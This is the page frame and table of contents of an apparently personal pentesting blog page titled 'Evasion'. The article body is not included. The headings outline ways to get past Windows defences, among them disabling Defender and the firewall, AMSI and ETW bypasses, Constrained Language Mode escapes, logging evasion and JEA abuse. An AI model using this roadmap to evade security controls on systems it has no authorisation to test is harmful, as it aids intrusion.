
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Projects Showcase">
      
      
      
        <link rel="canonical" href="http://blog.cuhawk.co.uk/pentesting/Evasion/">
      
      
        <link rel="prev" href="../">
      
      
        <link rel="next" href="../linux/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.27">
    
    
      
        <title>Evasion - Cuhawk's Blog</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.6543a935.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#evasion" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Cuhawk&#39;s Blog" class="md-header__button md-logo" aria-label="Cuhawk's Blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Cuhawk's Blog
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Evasion
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../programming/" class="md-tabs__link">
          
  
  Programming

        </a>
      </li>
    
  

      
        
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../" class="md-tabs__link">
          
  
  Pentesting

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../certifications/oscp/" class="md-tabs__link">
          
  
  Certifications

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Cuhawk&#39;s Blog" class="md-nav__button md-logo" aria-label="Cuhawk's Blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Cuhawk's Blog
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Programming
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Programming
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DSA
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/DSA/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DFS vs BFS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/bitwise/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bitwise
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Reverse/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reversing Bits
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Maximize%20shortcut%20nodes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Max Number of Edges
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Sorting%20Idealogy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sorting Idealogy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Tree%20Use%20Idealogy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tree Use Idealogy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/React/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ReactJS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Snake/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Snake C++
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Booking%20API%20C%23/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Booking API
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/GameServer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Game Server
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../programming/Milk%20App%20c%23/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Milk Storage C#
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Pentesting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Pentesting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Evasion
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Evasion
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#general" class="md-nav__link">
    <span class="md-ellipsis">
      General
    </span>
  </a>
  
    <nav class="md-nav" aria-label="General">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-av-edr" class="md-nav__link">
    <span class="md-ellipsis">
      Enumerating AV / EDR
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Enumerating AV / EDR">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#run-against-multiple-targets" class="md-nav__link">
    <span class="md-ellipsis">
      Run against multiple targets
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-all-gpos-applied-to-a-machine" class="md-nav__link">
    <span class="md-ellipsis">
      Get all GPO's applied to a machine
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-defender" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Defender
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Defender">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-if-windows-defender-is-running" class="md-nav__link">
    <span class="md-ellipsis">
      Check if windows defender is running
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-info-about-windows-defender" class="md-nav__link">
    <span class="md-ellipsis">
      Get info about Windows Defender
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#find-excluded-folder-from-windows-defender" class="md-nav__link">
    <span class="md-ellipsis">
      Find excluded folder from Windows Defender
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#script-to-dump-mde-config-asr-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Script to dump MDE config / ASR rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-exclusion" class="md-nav__link">
    <span class="md-ellipsis">
      Create exclusion
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-av-detections" class="md-nav__link">
    <span class="md-ellipsis">
      Check AV Detections
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-last-av-detection" class="md-nav__link">
    <span class="md-ellipsis">
      Get last AV Detection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#disable-av-monitoring" class="md-nav__link">
    <span class="md-ellipsis">
      Disable AV monitoring
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#asr-rules" class="md-nav__link">
    <span class="md-ellipsis">
      ASR Rules
    </span>
  </a>
  
    <nav class="md-nav" aria-label="ASR Rules">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerate-asr-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Enumerate ASR rules
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-firewall" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Firewall
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Firewall">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#get-state" class="md-nav__link">
    <span class="md-ellipsis">
      Get state
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Get rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#disable-firewall" class="md-nav__link">
    <span class="md-ellipsis">
      Disable Firewall
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enable-firewall" class="md-nav__link">
    <span class="md-ellipsis">
      Enable firewall
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#change-default-policy" class="md-nav__link">
    <span class="md-ellipsis">
      Change default policy
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#open-port-on-firewall" class="md-nav__link">
    <span class="md-ellipsis">
      Open port on firewall
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remove-firewall-rule" class="md-nav__link">
    <span class="md-ellipsis">
      Remove firewall rule
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#powershell" class="md-nav__link">
    <span class="md-ellipsis">
      PowerShell
    </span>
  </a>
  
    <nav class="md-nav" aria-label="PowerShell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#powershell-detections" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell detections
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#start-64-bit-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Start 64 bit powershell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execution-policy" class="md-nav__link">
    <span class="md-ellipsis">
      Execution-policy
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Execution-policy">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#get-execution-policy" class="md-nav__link">
    <span class="md-ellipsis">
      Get Execution policy
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypass-execution-policy" class="md-nav__link">
    <span class="md-ellipsis">
      Bypass execution policy
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#amsi" class="md-nav__link">
    <span class="md-ellipsis">
      AMSI
    </span>
  </a>
  
    <nav class="md-nav" aria-label="AMSI">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#amsi-bypass-string" class="md-nav__link">
    <span class="md-ellipsis">
      AMSI bypass string
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#amsi-bypass-string-obfuscated" class="md-nav__link">
    <span class="md-ellipsis">
      AMSI bypass string obfuscated
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#amsi-bypass-string-2-obfuscated" class="md-nav__link">
    <span class="md-ellipsis">
      AMSI bypass string 2 obfuscated
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#etw" class="md-nav__link">
    <span class="md-ellipsis">
      ETW
    </span>
  </a>
  
    <nav class="md-nav" aria-label="ETW">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#obfusacted" class="md-nav__link">
    <span class="md-ellipsis">
      Obfusacted
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#constrained-lanuage-mode" class="md-nav__link">
    <span class="md-ellipsis">
      Constrained Lanuage Mode
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Constrained Lanuage Mode">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-the-language-mode" class="md-nav__link">
    <span class="md-ellipsis">
      Check the language mode
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#escapes-for-constrained-language-mode" class="md-nav__link">
    <span class="md-ellipsis">
      Escapes for Constrained Language Mode
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Escapes for Constrained Language Mode">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#launch-powershell-version-2" class="md-nav__link">
    <span class="md-ellipsis">
      Launch Powershell Version 2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#overwrite-__pslockdownpolicy-variable" class="md-nav__link">
    <span class="md-ellipsis">
      Overwrite __PSLockdownPolicy variable
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-the-__pslockdownpolicy-value" class="md-nav__link">
    <span class="md-ellipsis">
      Check the __PSLockdownPolicy value
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#set-lockdown-policy-to-8-and-check-language-mode" class="md-nav__link">
    <span class="md-ellipsis">
      Set lockdown policy to 8 and check language mode
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershx" class="md-nav__link">
    <span class="md-ellipsis">
      PowerShx
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershdll-run-powershell-with-dlls-only" class="md-nav__link">
    <span class="md-ellipsis">
      PowerShdll Run PowerShell with dlls only.
    </span>
  </a>
  
    <nav class="md-nav" aria-label="PowerShdll Run PowerShell with dlls only.">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#download-files-with-certutil" class="md-nav__link">
    <span class="md-ellipsis">
      Download files with certutil
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execute-scripts" class="md-nav__link">
    <span class="md-ellipsis">
      Execute scripts
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      Logging evasion
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Logging evasion">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#invisi-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Invisi-shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#with-admin-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      With admin privileges
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#with-non-admin-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      With non-admin privileges:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#script-block-logging-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      Script Block logging bypass
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Script Block logging bypass">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#winrs" class="md-nav__link">
    <span class="md-ellipsis">
      Winrs
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#just-enough-admin" class="md-nav__link">
    <span class="md-ellipsis">
      Just Enough Admin
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Just Enough Admin">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#connect-with-jea-endpoint" class="md-nav__link">
    <span class="md-ellipsis">
      Connect with JEA endpoint
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-the-pssession-configurations-and-jea" class="md-nav__link">
    <span class="md-ellipsis">
      Get the PSSession configurations (and JEA)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-pssession-capabilities" class="md-nav__link">
    <span class="md-ellipsis">
      Get PSSession capabilities
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-jea" class="md-nav__link">
    <span class="md-ellipsis">
      Abuse JEA
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Abuse JEA">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#abuse-creating-functions" class="md-nav__link">
    <span class="md-ellipsis">
      Abuse - Creating functions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-grant-a-user-to-admin" class="md-nav__link">
    <span class="md-ellipsis">
      Abuse - Grant a user to admin
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-running-arbritary-code" class="md-nav__link">
    <span class="md-ellipsis">
      Abuse - Running arbritary code
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-set-pssessionconfiguration" class="md-nav__link">
    <span class="md-ellipsis">
      Abuse - Set-PSSessionConfiguration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Abuse - Set-PSSessionConfiguration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#connect-and-check-the-config" class="md-nav__link">
    <span class="md-ellipsis">
      Connect and check the config
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-original-sddl" class="md-nav__link">
    <span class="md-ellipsis">
      Get original SDDL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-sid-for-new-user-to-add" class="md-nav__link">
    <span class="md-ellipsis">
      Get SID for new user to add
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-new-sddl-with-a-new-user-sid" class="md-nav__link">
    <span class="md-ellipsis">
      Create new SDDL with a new USER SID
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#change-the-config" class="md-nav__link">
    <span class="md-ellipsis">
      Change the config
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reconnect-and-check-the-config" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnect and check the config
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#connect-to-reconfigured-new-endpoint" class="md-nav__link">
    <span class="md-ellipsis">
      Connect to reconfigured new endpoint
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#applocker" class="md-nav__link">
    <span class="md-ellipsis">
      Applocker
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Applocker">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-if-applocker-is-enabled" class="md-nav__link">
    <span class="md-ellipsis">
      Check if Applocker is enabled
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerate-applocker-policy" class="md-nav__link">
    <span class="md-ellipsis">
      Enumerate Applocker policy
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-policy-with-gporesult" class="md-nav__link">
    <span class="md-ellipsis">
      Check policy with GPOresult
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#parse-gpo-applocker" class="md-nav__link">
    <span class="md-ellipsis">
      Parse GPO applocker
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#if-code-integrity-is-enforced-and-powershell-is-running-in-constrained-langauge-mode-use-winrs-instead-of-psremoting" class="md-nav__link">
    <span class="md-ellipsis">
      If code integrity is enforced and PowerShell is running in Constrained Langauge Mode use winrs instead of psremoting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-for-the-policy-on-disk" class="md-nav__link">
    <span class="md-ellipsis">
      Check for the policy on disk
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wdac" class="md-nav__link">
    <span class="md-ellipsis">
      WDAC
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#disable-wdac" class="md-nav__link">
    <span class="md-ellipsis">
      Disable WDAC
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Disable WDAC">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-for-wdac" class="md-nav__link">
    <span class="md-ellipsis">
      Check for WDAC
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-for-the-policy-on-disk_1" class="md-nav__link">
    <span class="md-ellipsis">
      Check for the policy on disk
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#code-signing" class="md-nav__link">
    <span class="md-ellipsis">
      Code signing
    </span>
  </a>
  
